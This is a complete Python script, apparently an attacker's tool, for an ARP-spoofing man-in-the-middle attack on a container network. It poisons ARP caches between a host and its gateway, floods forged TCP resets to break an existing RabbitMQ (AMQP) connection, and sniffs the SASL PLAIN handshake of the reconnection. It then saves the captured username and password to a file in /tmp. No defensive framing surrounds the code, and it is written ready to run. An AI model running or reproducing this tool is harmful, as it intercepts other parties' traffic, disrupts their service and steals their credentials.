#!/usr/bin/env python3
"""
ARP MITM v9: Continuous RST flood + selective old-connection drop.
Key insight: send RSTs every captured packet, using FRESH ack.
Also drop old-port traffic while relaying new connections.
"""
import socket, struct, time, threading

IFACE = "eth1"
OUR_MAC = bytes.fromhex("369822861110")
AGENT_MAC = bytes.fromhex("9af0af4b510f")
GW_MAC = bytes.fromhex("8a2a3548b779")
GW_IP = "172.18.0.1"
AGENT_IPS = ["172.17.0.2", "172.18.0.2"]
RABBIT_IP = "188.225.85.94"
RABBIT_PORT = 5672

TOTAL_SECS = 90
OUT = "/tmp/mitm_results.txt"
running = True

def log(msg):
    with open(OUT, "a") as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")

def arp_reply(sm, sip, dm, dip):
    return (dm + sm + b'\x08\x06' +
            struct.pack('!HHBBH', 1, 0x0800, 6, 4, 2) +
            sm + socket.inet_aton(sip) + dm + socket.inet_aton(dip))

def spoof_loop():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    s.bind((IFACE, 0))
    p1 = arp_reply(OUR_MAC, GW_IP, AGENT_MAC, "172.18.0.2")
    p2 = arp_reply(OUR_MAC, "172.18.0.2", GW_MAC, GW_IP)
    while running:
        try: s.send(p1); s.send(p2)
        except: pass
        time.sleep(1)

def restore_arp():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    s.bind((IFACE, 0))
    r1 = arp_reply(GW_MAC, GW_IP, AGENT_MAC, "172.18.0.2")
    r2 = arp_reply(AGENT_MAC, "172.18.0.2", GW_MAC, GW_IP)
    for _ in range(5): s.send(r1); s.send(r2); time.sleep(0.3)
    s.close()

def tcp_cksum(src_ip, dst_ip, tcp_hdr):
    pseudo = socket.inet_aton(src_ip) + socket.inet_aton(dst_ip)
    pseudo += struct.pack('!BBH', 0, 6, len(tcp_hdr))
    data = pseudo + tcp_hdr
    if len(data) % 2: data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    while s >> 16: s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def ip_cksum(hdr):
    if len(hdr) % 2: hdr += b'\x00'
    s = 0
    for i in range(0, len(hdr), 2):
        s += (hdr[i] << 8) + hdr[i+1]
    while s >> 16: s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def make_rst(src_ip, sport, dst_ip, dport, seq_num):
    tcp_hdr = struct.pack('!HHIIBBHHH',
        sport, dport, seq_num, 0,
        (5 << 4), 0x04, 0, 0, 0)
    ck = tcp_cksum(src_ip, dst_ip, tcp_hdr)
    tcp_hdr = tcp_hdr[:16] + struct.pack('!H', ck) + tcp_hdr[18:]
    ip_hdr = struct.pack('!BBHHHBBH', 0x45, 0, 40, 0x1234, 0x4000, 64, 6, 0)
    ip_hdr += socket.inet_aton(src_ip) + socket.inet_aton(dst_ip)
    ic = ip_cksum(ip_hdr)
    ip_hdr = ip_hdr[:10] + struct.pack('!H', ic) + ip_hdr[12:]
    return AGENT_MAC + OUR_MAC + b'\x08\x00' + ip_hdr + tcp_hdr

def extract_sasl(payload):
    if b'PLAIN' not in payload: return None
    for start in range(len(payload)):
        if payload[start:start+5] == b'PLAIN':
            region = payload[start:]
            i = 0
            while i < len(region) - 5:
                if region[i] == 0 and i + 1 < len(region):
                    j = i + 1
                    while j < len(region) and 32 <= region[j] < 127: j += 1
                    if j - i - 1 > 3 and j < len(region) and region[j] == 0:
                        user = region[i+1:j].decode('ascii', errors='ignore')
                        k = j + 1
                        while k < len(region) and 32 <= region[k] < 127: k += 1
                        if k - j - 1 > 5:
                            return user, region[j+1:k].decode('ascii', errors='ignore')
                i += 1
            break
    return None

def main():
    global running
    with open(OUT, "w") as f:
        f.write(f"MITM v9 started {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    t = threading.Thread(target=spoof_loop, daemon=True)
    t.start()
    time.sleep(2)

    recv = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    recv.bind((IFACE, 0))
    send = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    send.bind((IFACE, 0))

    old_port = None
    creds_found = None
    rst_count = 0
    drop_count = 0
    relay_count = 0
    new_conn = 0
    start = time.time()
    phase = "capture"  # capture -> rst_flood -> listen

    log("Phase: capture old port...")

    while running and time.time() < start + TOTAL_SECS:
        try:
            recv.settimeout(0.5)
            frame = recv.recv(65535)
            if len(frame) < 14: continue
            if frame[0:6] != OUR_MAC: continue
            src_mac = frame[6:12]
            eth_type = struct.unpack('!H', frame[12:14])[0]
            if eth_type == 0x0806: continue

            if src_mac == AGENT_MAC: relay_dst = GW_MAC
            elif src_mac == GW_MAC: relay_dst = AGENT_MAC
            else: continue

            is_tcp = eth_type == 0x0800 and len(frame) >= 54 and frame[23] == 6
            sport = dport = 0
            if is_tcp:
                ihl = (frame[14] & 0xF) * 4
                tcp_off = 14 + ihl
                sport, dport = struct.unpack('!HH', frame[tcp_off:tcp_off+4])

            is_amqp = is_tcp and (sport == RABBIT_PORT or dport == RABBIT_PORT)

            if phase == "capture" and is_amqp and src_mac == AGENT_MAC and dport == RABBIT_PORT:
                old_port = sport
                seq, ack = struct.unpack('!II', frame[tcp_off+4:tcp_off+12])
                src_ip = socket.inet_ntoa(frame[26:30])
                log(f"Old conn: {src_ip}:{sport}->5672 seq={seq} ack={ack}")
                phase = "rst_flood"
                log(f"Phase: RST flood on port {old_port}, blocking old, relaying new")

            if phase == "rst_flood" and is_amqp:
                if src_mac == AGENT_MAC and dport == RABBIT_PORT and sport == old_port:
                    seq, ack = struct.unpack('!II', frame[tcp_off+4:tcp_off+12])
                    # Send RST with FRESH ack immediately
                    for dst_ip in AGENT_IPS:
                        rst = make_rst(RABBIT_IP, RABBIT_PORT, dst_ip, old_port, ack)
                        send.send(rst)
                        rst_count += 1
                    # Also send RST to RabbitMQ (from agent)
                    for src_ip_c in AGENT_IPS:
                        rst2 = make_rst(src_ip_c, old_port, RABBIT_IP, RABBIT_PORT, seq)
                        # This one needs to go to gw
                        rst2_frame = GW_MAC + OUR_MAC + b'\x08\x00' + rst2[14:]
                        send.send(rst2_frame)
                        rst_count += 1
                    drop_count += 1
                    if drop_count % 5 == 1:
                        log(f"  RST #{rst_count} drop #{drop_count} ack={ack}")
                    continue  # DON'T relay old connection

                if src_mac == GW_MAC and sport == RABBIT_PORT:
                    # Inbound to old port — check if it's the old connection
                    dst_port_check = struct.unpack('!H', frame[tcp_off+2:tcp_off+4])[0]
                    if dst_port_check == old_port:
                        drop_count += 1
                        continue  # Drop inbound to old conn too

                # Check for NEW AMQP connection
                if src_mac == AGENT_MAC and dport == RABBIT_PORT and sport != old_port:
                    new_conn += 1
                    tcp_flags = frame[tcp_off+13]
                    src_ip = socket.inet_ntoa(frame[26:30])
                    if tcp_flags & 0x02:
                        log(f"  *** NEW SYN! {src_ip}:{sport}->5672 ***")

                # Check for SASL in new connection
                if is_amqp and sport != old_port and dport != old_port:
                    thl = ((frame[tcp_off+12] >> 4) & 0xF) * 4
                    payload = frame[tcp_off+thl:]
                    tcp_flags = frame[tcp_off+13]
                    src_ip = socket.inet_ntoa(frame[26:30])

                    if payload and payload[:4] == b'AMQP':
                        log(f"  *** AMQP header on new conn: {payload[:8].hex()} ***")

                    if payload and b'\x00\x0a\x00\x0b' in payload:
                        log(f"  *** Start-Ok ({len(payload)}b) ***")
                        log(f"  Hex: {payload.hex()}")
                        creds = extract_sasl(payload)
                        if creds:
                            log(f"  *** CREDS: {creds[0]} / {creds[1]} ***")
                            with open("/tmp/amqp_creds.txt", "w") as cf:
                                cf.write(f"user={creds[0]}\npass={creds[1]}\ntime={time.strftime('%H:%M:%S')}\n")
                            creds_found = creds

                    if payload and b'PLAIN' in payload and not creds_found:
                        log(f"  PLAIN ({len(payload)}b): {payload[:600].hex()}")
                        creds = extract_sasl(payload)
                        if creds:
                            log(f"  *** CREDS: {creds[0]} / {creds[1]} ***")
                            with open("/tmp/amqp_creds.txt", "w") as cf:
                                cf.write(f"user={creds[0]}\npass={creds[1]}\ntime={time.strftime('%H:%M:%S')}\n")
                            creds_found = creds

            # Relay non-old-connection traffic
            relayed = relay_dst + OUR_MAC + frame[12:]
            try: send.send(relayed); relay_count += 1
            except: pass

            if creds_found:
                log("GOT CREDS!")
                break

        except socket.timeout: pass
        except Exception as e: log(f"Err: {e}")

    running = False
    log("Restoring ARP...")
    restore_arp()
    log(f"Stats: rst={rst_count} drop={drop_count} relay={relay_count} new_conn={new_conn}")
    log(f"Creds: {'FOUND '+creds_found[0]+'/'+creds_found[1] if creds_found else 'NOT FOUND'}")
    log("Done.")

if __name__ == '__main__':
    main()
